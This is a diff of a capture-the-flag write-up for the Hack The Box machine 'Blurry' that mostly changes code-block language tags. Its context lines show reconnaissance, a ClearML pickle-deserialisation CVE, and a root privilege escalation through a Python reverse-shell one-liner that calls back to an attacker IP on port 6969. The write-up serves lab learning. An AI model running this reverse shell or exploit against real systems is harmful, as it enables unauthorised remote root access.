@@ -23,7 +23,7 @@ cover:
 
 I performed a quick Nmap scan on the target to identify open ports:
 
-```
+```jsx
 PORT   STATE SERVICE REASON
 22/tcp open  ssh     syn-ack
 80/tcp open  http    syn-ack
@@ -33,7 +33,7 @@ After discovering the open ports, I conducted an aggressive scan on the target f
 
 `sudo nmap 10.10.11.19 -T4 -vv -sV -sC -O -A` 
 
-```
+```jsx
 PORT   STATE SERVICE REASON         VERSION
 22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
 | ssh-hostkey: 
@@ -52,19 +52,19 @@ PORT   STATE SERVICE REASON         VERSION
 
 I discovered that the HTTP server is hosted at **blurry.htb**, and the Nmap results also revealed **app.blurry.htb**. To access these web pages, I added both domains to the `/etc/hosts` file using the following command:
 
-```
+```bash
 echo "10.10.11.19 blurry.htb app.blurry.htb" >> /etc/hosts
 ```
 
 I also ran a Gobuster vhost scan to search for additional subdomains:
 
-```
+```bash
 gobuster vhost -u blurry.htb -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 90 --append-domain
 ```
 
 Surprisingly, the scan revealed more subdomains. I added all of them to the `/etc/hosts` file as well:
 
-```
+```bash
 echo "10.10.11.19 blurry.htb app.blurry.htb files.blurry.htb chat.blurry.htb api.blurry.htb" >> /etc/hosts
 ```
 
@@ -90,7 +90,7 @@ Now, I will try to set up ClearML locally on my machine.
 
 I followed this guide to set it up:
 
-```
+```bash
 ┌──(kali㉿kali)-[~/blurry]
 └─$ sudo apt install python3.11-venv
 [sudo] password for kali: 
@@ -155,7 +155,6 @@ Credentials verified!
 
 New configuration stored in /home/kali/clearml.conf
 ClearML setup completed successfully.
-
 ```
 
 The configuration file can be found at the **app.blurry.htb** endpoint when we enter a username, select "New Experiment," and retrieve the config file from there.
@@ -164,7 +163,7 @@ The configuration file can be found at the **app.blurry.htb** endpoint when we e
 
 I found a recent CVE-2024–24590: Pickle Load on Artifact Get related to ClearML. The following is the script we will be using.
 
-```
+```python
 import os
 import subprocess
 from clearml import Task
@@ -206,7 +205,7 @@ At this point, we have a shell as the user and have obtained the user flag.
 
 If I run `sudo -l`, I can see that I can execute the `/usr/bin/evaluate_model` binary as root without needing a password.
 
-```
+```bash
 jippity@blurry:~$ sudo -l
 Matching Defaults entries for jippity on blurry:
     env_reset, mail_badpass,
@@ -220,7 +219,7 @@ This Bash script searches for files that end with `.pth` in the `/models` direct
 
 I will now open a Netcat session on my Kali machine on port 6969. Then, I removed the `evaluate_model.py` script from the `/models` directory.
 
-```
+```bash
 jippity@blurry:~$ cd /models
 jippity@blurry:/models$ ls
 demo_model.pth  evaluate_model.py
@@ -232,7 +231,7 @@ demo_model.pth
 
 I created the same file (which I made using `echo` and appended the code) named `evaluate_model.py` with the script shown below (the output of the `cat` command):
 
-```
+```bash
 jippity@blurry:/models$ echo 'import socket, subprocess, os, pty; s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect(("10.10.16.62", 6969)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); pty.spawn("/bin/bash")' > evaluate_model.py
 jippity@blurry:/models$ cat evaluate_model.py 
 echo 'import socket, subprocess, os, pty; s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect(("10.10.16.62", 6969)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); pty.spawn("/bin/bash")' > evaluate_model.py
@@ -240,7 +239,7 @@ echo 'import socket, subprocess, os, pty; s=socket.socket(socket.AF_INET, socket
 
 I ran `sudo /usr/bin/evaluate_model /models/*.pth`, and when I checked my Netcat session, I saw:
 
-```
+```bash
 ┌──(kali㉿kali)-[~/blurry/CVE]
 └─$ nc -lnvp 6969
 listening on [any] 6969 ...
